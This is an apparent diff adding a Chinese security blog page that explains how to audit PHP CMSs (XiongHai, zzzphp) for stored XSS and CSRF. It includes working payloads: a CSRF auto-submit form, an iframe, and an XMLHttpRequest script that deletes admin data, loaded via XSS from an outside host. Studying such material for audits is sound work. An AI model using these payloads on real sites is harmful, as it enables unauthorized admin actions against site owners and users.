@@ -1,0 +1,209 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>测试4 - welcome to Lennon&#39;s index</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="人生如梭, 何不留下自己的印记,0x00 XSS简介XSS分为反射型和储存型，一般来说反射型的用处不是很大利用难度相对较高，存储型XSS一般常见于发布评论、留言、收获地址、个人信息等等。对于xss的审计我们一般就在这些点找，有用户,"> 
+    <meta name="author" content="Lennon"> 
+    <link rel="alternative" href="atom.xml" title="welcome to Lennon&#39;s index" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">welcome to Lennon&#39;s index</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://lennon.work"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">测试4</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">测试4</h1>
+        <div class="stuff">
+            <span>十二月 30, 2020</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h1 id="0x00-XSS简介"><a href="#0x00-XSS简介" class="headerlink" title="0x00 XSS简介"></a>0x00 XSS简介</h1><p>XSS分为反射型和储存型，一般来说反射型的用处不是很大利用难度相对较高，存储型XSS一般常见于发布评论、留言、收获地址、个人信息等等。对于xss的审计我们一般就在这些点找，有用户控制输入信息输出的地方都是它出现的地方，很多网站的突破口可能就是一个XSS。</p>
+<h1 id="0x01-XSS实战审计"><a href="#0x01-XSS实战审计" class="headerlink" title="0x01 XSS实战审计"></a>0x01 XSS实战审计</h1><p>这次选用的CMS还是熊海，我们通过搭建环境查看输入的地方来审计，学习下高效率审计方式。</p>
+<p><img src="./img/1.4.1.png" alt="file"></p>
+<p>随意留言抓包看看他请求的url再去找相对的文件<code>/?r=submit&amp;type=message</code> 当然你还是得看看他是怎么调用文件的，这里就是加载submit文件中的message方法。</p>
+<p>我们来到 files/submit.php</p>
+<p><img src="./img/1.4.2.png" alt="file"></p>
+<p>前面的输入基本都没过过滤，到了最后一步<code>$content</code>被 <code>addslashes(strip_tags($content));</code>过滤，所以我们XSS其他地方即可，看到这里我们在挖洞的过程中所以不要纠结一点。</p>
+<p><img src="./img/1.4.3.png" alt="file"></p>
+<p>一般过滤xss的函数还有<code>htmlspecialchars</code>，我们审计他的注意点就是查看一些输出函数print、print_r、echo、printf、die、var_dump、var_export。</p>
+<h1 id="0x02-Csrf"><a href="#0x02-Csrf" class="headerlink" title="0x02 Csrf"></a>0x02 Csrf</h1><p>CSRF（Cross-site request forgery），中文名称：跨站请求伪造，也被称为：one click attack/session riding，缩写为：CSRF/XSRF。<br>CSRF实际上就是利用你的身份去发送恶意请求，我们需要知道CSRF分为GET型提交的和POST，前者危害更大，后者一般可以寻找XSS来配合我们。GET型的比如一个链接 <a target="_blank" rel="noopener" href="http://www.404.com/1.php?id=1">http://www.404.com/1.php?id=1</a> 访问即可删除账号，然后你在论坛发帖构造<br><code>&lt;img src=&quot;http://www.404.com/1.php?id=1&quot;&gt;</code> 那么访问这个帖子的人账号都将会删除，POST的见下文，造成CSRF的原因就是没有使用token或者验证其他值，审计就看页面有没有token、referer验证，验证是否可以绕过，不过我推荐还是先黑盒，看看有没有token，删除了referer是否能够访问，再结合代码来看。</p>
+<p>我们来看到zzzphp的后台，他是没有token的，同时我们前面审计到了他的代码执行，配合这个csrf就可以直接getshell。</p>
+<p><img src="./img/1.4.4.png" alt="file"></p>
+<p>如果你不会自己写这个代码，不妨使用burp生成一个测试页面，右键选择即可。</p>
+<p><img src="./img/1.4.5.png" alt="file"></p>
+<p>这是个需要点击的表单,你可以加一段JavaScript代码来自动提交。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; document.forms[0].submit(); &lt;&#x2F;script&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h1 id="0x03-组合利用"><a href="#0x03-组合利用" class="headerlink" title="0x03 组合利用"></a>0x03 组合利用</h1><p>这里只是个简单的组合，由于没找到具体实验环境我只有简单的演示一下(懒)<br>本次选妃zzzphp，由于他后台没有的xss，我只能登陆后台后查看前台了。</p>
+<p>1.构造CSRF表单自动提交<br>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">         &#x2F;&#x2F;burp生成的表单</span><br><span class="line">      &lt;script&gt; document.forms[0].submit(); &lt;&#x2F;script&gt; </span><br><span class="line"></span><br><span class="line">  &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>2.插入iframe标签</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src&#x3D;&quot;http:&#x2F;&#x2F;404.com&#x2F;zzzp6p&#x2F;1.html&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure>
+<p>还可以使用XMLHTTPRequest发送POST、GET，按情况选择，这里把payload插入手机号码。</p>
+<p><img src="./img/1.4.6.png" alt="file"></p>
+<p>用登陆了后台后访问页面，可以看到显示修改成功。</p>
+<p>由于没找到想要的源码我简单介绍下利用XMLHTTPRequest来发包,漏洞程序还是熊海cms删除一友情链接</p>
+<p>payload 1.js：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function del() &#123;</span><br><span class="line">    var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">    xhr.open(&#39;GET&#39;,&#39;&#x2F;xiong&#x2F;admin&#x2F;?r&#x3D;linklist&amp;delete&#x3D;6&#39;);</span><br><span class="line">    xhr.send(null);</span><br><span class="line">    &#125;</span><br><span class="line">del();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;404.com&#x2F;xiong&#x2F;1.js&quot;&gt;&lt;&#x2F;script&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>查看留言板可以看到我们的XMLHTTPRequest已经发包了</p>
+<p><img src="./img/1.4.7.png" alt="file"></p>
+<p>比较典型的例子可以看看 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3177">https://xz.aliyun.com/t/3177</a></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='true'
+        data-ae='true'
+        data-ci='21049a529d013a30a94c'
+        data-cs='e9ea3d1733f0d9d2b4237edb56f96aa395e4baab'
+        data-r='https://github.com/lennon-liu/MyGitalk'
+        data-o='https://github.com/lennon-liu/'
+        data-a='https://github.com/lennon-liu/'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
